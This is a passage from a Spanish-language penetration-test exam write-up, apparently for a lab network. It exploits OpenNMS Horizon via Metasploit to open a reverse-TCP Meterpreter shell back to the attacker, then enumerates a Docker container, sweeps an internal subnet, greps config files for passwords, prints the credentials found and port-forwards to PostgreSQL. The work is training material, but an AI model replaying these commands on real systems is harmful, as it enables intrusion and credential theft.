[*] Meterpreter session 1 opened (10.10.14.19:4444 -> 10.129.101.37:34058) at 2025-12-16 02:12:16 +0800
[*] Attempting cleanup...

meterpreter > getuid
Server username: opennms
```

Bingo! Estamos dentro.&#x20;

### Acceso interno

```bash
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.14.19:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Successfully edited notificationCommands.xml
[*] Successfully edited destinationPaths.xml
[*] Successfully edited notifications.xml
[+] Successfully uploaded the payload to buuigpgqj.bsh
[*] Triggering the notification to execute the payload
[*] Received expected response while triggering the payload. Please be patient, it may take a few seconds for the payload to execute.
[*] Sending stage (3045380 bytes) to 10.129.101.37
[*] Meterpreter session 1 opened (10.10.14.19:4444 -> 10.129.101.37:34058) at 2025-12-16 02:12:16 +0800
[*] Attempting cleanup...

meterpreter > getuid
Server username: opennms
```

### Enumeración inicial

```bash
meterpreter > sysinfo
Computer     : 172.18.0.9
OS           : Ubuntu 22.04 (Linux 5.4.0-131-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

Estamos en la máquina `172.18.0.9`, una máquina de la red interna, pero está fuera del scope del examen.

| URL/CIDR          | Description             |
| ----------------- | ----------------------- |
| `trilocor.local`  | Main Trilocor website   |
| `172.16.139.0/24` | Internal network subnet |
| `172.16.210.0/24` | Internal network subnet |

```bash
meterpreter > shell
Process 6344 created.
Channel 1 created.

hostname
fe16e33f0cfc

whoami
opennms

id
uid=10001(opennms) gid=10001(opennms) groups=10001(opennms)
```

No podemos acceder a `/home` o `/root`:

```bash
meterpreter > cd home
meterpreter > ls
No entries exist in /home
meterpreter > cd root
[-] stdapi_fs_chdir: Operation failed: 2
```

La presencia de archivos como `.dockerenv` o el hostname en hexadecimal (`fe16e33f0cfc`) nos indica que estamos en un contenedor de Docker y no nos podríamos mover lateralmente a otras máquinas de la red:

```bash
meterpreter > ls
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2022-10-14 01:56:58 +0800  .dockerenv
040755/rwxr-xr-x  4096  dir   2022-10-13 11:01:41 +0800  bin
040755/rwxr-xr-x  4096  dir   2022-04-18 18:28:59 +0800  boot
040755/rwxr-xr-x  340   dir   2025-12-16 02:31:25 +0800  dev
100755/rwxr-xr-x  8193  fil   2022-10-13 11:00:02 +0800  entrypoint.sh
040755/rwxr-xr-x  4096  dir   2022-10-14 01:56:58 +0800  etc
040755/rwxr-xr-x  4096  dir   2022-04-18 18:28:59 +0800  home
040755/rwxr-xr-x  4096  dir   2022-10-13 11:01:37 +0800  lib
040755/rwxr-xr-x  4096  dir   2022-08-01 21:22:43 +0800  lib32
<SNIP>
```

### Ping Sweep con Metasploit

Vamos a descubrir las máquinas dentro de esta subred `172.18.0.9` aunque no pertenece a las subredes dentro del scope, por s pudiéramos hacernos con más información:

| URL/CIDR          | Description             |
| ----------------- | ----------------------- |
| `trilocor.local`  | Main Trilocor website   |
| `172.16.139.0/24` | Internal network subnet |
| `172.16.210.0/24` | Internal network subnet |

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > use post/multi/manage/autoroute 
msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set subnet 172.18.0.0
subnet => 172.18.0.0
msf6 post(multi/manage/autoroute) > run
[*] Running module against 172.18.0.9 (172.18.0.9)
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

```bash
msf6 post(multi/manage/autoroute) > use post/multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep) > options

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.129.101.37    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/gather/ping_sweep) > set rhosts 172.18.0.0/23
rhosts => 172.18.0/23
msf6 post(multi/gather/ping_sweep) > set SESSION 1
SESSION => 1
msf6 post(multi/gather/ping_sweep) > run
[*] Performing ping sweep for IP range 172.18.0.0/23
[+] 	172.18.0.9 host found
[+] 	172.18.0.1 host found
[+] 	172.18.0.3 host found
[+] 	172.18.0.2 host found
[+] 	172.18.0.4 host found
[+] 	172.18.0.5 host found
[+] 	172.18.0.7 host found
[+] 	172.18.0.6 host found
[+] 	172.18.0.8 host found
[+] 	172.18.0.12 host found
[+] 	172.18.0.10 host found
[+] 	172.18.0.13 host found
[+] 	172.18.0.14 host found
[+] 	172.18.0.11 host found
[*] Post module execution completed
```

Encontramos algunos hosts en la subred, pero no seguiremos más allá porque quedan fuera del scope del examen.

### Credential Hunting

Buscaremos credenciales que podamos reaprovechar en otros hosts:

```bash
# 1. Buscar en archivos de configuración de OpenNMS
grep -r "password\|passwd\|PASS\|jdbc\|mysql\|postgres" /opt/opennms/etc/ 2>/dev/null
```

Ese comando nos vuelva una salida enorme y encontramos varias contraseñas interesantes:

#### 1. **Base de datos PostgreSQL**:

```bash
# Archivo: /opt/opennms/etc/opennms-datasources.xml
- Usuario: opennms, Contraseña: opennms
- Usuario: postgres, Contraseña: postgres
- URL: jdbc:postgresql://database:5432/opennms
```

#### 2. **Credenciales de sistema**:

```bash
# Archivo: /opt/opennms/etc/remedy.properties
 \nremedy.password=TNNwsC4ll

# Archivo: /opt/opennms/etc/javamail-configuration.xml
- opennms:opennms
- networksRusNOC:w00t

# Archivo: /opt/opennms/etc/ami-config.xml
- opennms:p455w0rd

# Archivo: /opt/opennms/etc/wsman-config.xml
- root:calvin

# Archivo: /opt/opennms/etc/wmi-config.xml
- Administrator:password (dominio: WORKGROUP)
```

### Acceso a la base de datos

#### Port Forwarding

Haremos un port forwarding a nuestra máquina de atacante para conectarnos a la base de datos, ya que no podemos directamente desde la shell:

```bash
meterpreter > portfwd add -L 127.0.0.1 -l 5433 -r database -p 5432
[*] Forward TCP relay created: (local) 127.0.0.1:5434 -> (remote) database:5432
```

Y accedemos a la base de datos desde nuestro Kali:

```bash
psql -h 127.0.0.1 -p 5433 -U opennms -W
Contraseña: opennms

psql (17.5 (Debian 17.5-1), servidor 12.12 (Debian 12.12-1.pgdg110+1))
Digite «help» para obtener ayuda.

opennms=#
```

#### Listamos las bases de datos

```plsql
opennms=# \l
                                                              Listado de base de datos
  Nombre   |  Dueño   | Codificación | Proveedor de locale |  Collate   |   Ctype    | Configuración regional | Reglas ICU: |      Privilegios      
-----------+----------+--------------+---------------------+------------+------------+------------------------+-------------+-----------------------
 opennms   | postgres | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | =Tc/postgres         +
           |          |              |                     |            |            |                        |             | postgres=CTc/postgres+
           |          |              |                     |            |            |                        |             | opennms=CTc/postgres
 postgres  | postgres | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | 
 template0 | postgres | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | =c/postgres          +
           |          |              |                     |            |            |                        |             | postgres=CTc/postgres
 template1 | postgres | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | =c/postgres          +
           |          |              |                     |            |            |                        |             | postgres=CTc/postgres
(4 filas)
```

#### Conectarse a opennms

```plsql
opennms=> \c opennms opennms
Contraseña para usuario opennms: 
psql (17.5 (Debian 17.5-1), servidor 12.12 (Debian 12.12-1.pgdg110+1))
Ahora está conectado a la base de datos «opennms» con el usuario «opennms».
opennms=> 
```

#### Listar tablas

```plsql
opennms=> \dt

opennms-> SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'public' AND table_name LIKE '%user%';
```

Parece que no nos deja listar las tablas y crashea en todos nuestros intentos, así que daremos por concluido este host.
